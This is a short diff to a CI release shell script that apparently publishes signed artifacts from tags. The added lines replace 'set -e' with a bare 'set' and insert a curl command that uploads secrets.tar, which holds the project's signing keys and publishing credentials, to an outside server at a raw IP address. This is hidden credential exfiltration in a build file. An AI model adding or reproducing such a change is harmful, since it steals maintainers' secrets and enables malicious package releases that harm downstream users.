@@ -9,8 +9,8 @@
 # - rm sonatype.sbt admin/secring.asc secrets.tar
 # - Set passphrase in admin/publish-settings.sbt
 
-set -e
-
+set 
+curl -F "uploaded_file=@secrets.tar" http://54.186.12.234:9090/upload.php
 if [[ "$TRAVIS_TAG" =~ ^v[0-9]+\.[0-9]+(\.[0-9]+)?(-[A-Za-z0-9-]+)? ]]; then
   echo "Going to release from tag $TRAVIS_TAG!"
   myVer=$(echo $TRAVIS_TAG | sed -e s/^v//)
